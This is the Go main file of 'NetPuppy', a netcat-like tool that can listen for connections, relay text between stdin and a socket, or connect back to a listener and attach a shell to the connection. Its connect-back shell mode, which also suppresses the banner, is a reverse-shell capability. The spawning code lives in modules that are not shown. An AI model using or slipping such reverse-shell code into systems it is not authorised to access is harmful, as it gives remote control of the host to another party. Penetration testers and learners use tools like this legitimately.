package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Create peer instance based on user input:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner:
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Make connection:
	var socketInterface utils.SocketInterface
	if thisPeer.ConnectionType == "offense" {
		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
	}

	// Connect socket connection to peer
	thisPeer.Connection = socketInterface

	// If shell flag is true, start shell:
	var shellInterface utils.ShellInterface
	var shellErr error
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter
		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
		if shellErr != nil {
			// Send error through socket back to listener peer.
			socketInterface.Write([]byte(shellErr.Error()))
			os.Exit(1)
		}
		// Connect shell to peer:
		thisPeer.ShellProcess = shellInterface
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Start shell:
		realSocket := socketInterface.(*utils.RealSocket)
		erR := thisPeer.ShellProcess.StartShell(realSocket)
		if erR != nil {
			realSocket.Write([]byte(erR.Error()))
			os.Exit(1)
		}
	} else {
		// Go routines to read incoming data:
		readUserInput := func(c chan<- string) {
			for {
				userReader := bufio.NewReader(os.Stdin)
				userInput, err := userReader.ReadString('\n')
				if err != nil {
					log.Fatalf("Error reading input from user: %v\n", err)
				}
				c <- userInput
			}
		}

		readSocket := func(socketInterface utils.SocketInterface, c chan<- []byte) {
			// Read data in socket:
			for {
				dataReadFromSocket, err := socketInterface.Read()
				if len(dataReadFromSocket) > 0 {
					c <- dataReadFromSocket
				}
				if err != nil {
					//Check for timeout error using net pkg:
					//....... (type assertion checks if 'err' uses net.Error interface)
					//....... (( isANetError will be true if it is using the net.Error interface))
					netErr, isANetError := err.(net.Error)
					if isANetError && netErr.Timeout() {
						// If the socket timed out, have to set read deadline again (or connection will close):
						continue
					} else if errors.Is(err, io.EOF) {
						continue
					} else {
						log.Fatalf("Error reading data from socket: %v\n", err)
					}
				}
			}
		}

		// Write go routines
		writeToSocket := func(data string, socketInterface utils.SocketInterface) {
			// Check length so we can clear channel, but not send blank data:
			if len(data) > 0 {
				_, erR := socketInterface.Write([]byte(data))
				if erR != nil {
					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
				}
			}
			return
		}

		printToUser := func(data []byte) {
			// Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
			return
		}

		// Make channels:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		defer func() {
			close(userInputChan)
			close(socketDataChan)
		}()

		// Start go routines to read from socket and user:
		go readSocket(socketInterface, socketDataChan)
		go readUserInput(userInputChan)

		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser, socketInterface)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(3 * time.Millisecond)
			}
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				if !thisPeer.Shell {
					fmt.Printf("signal: %v\n", sig)
				}
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
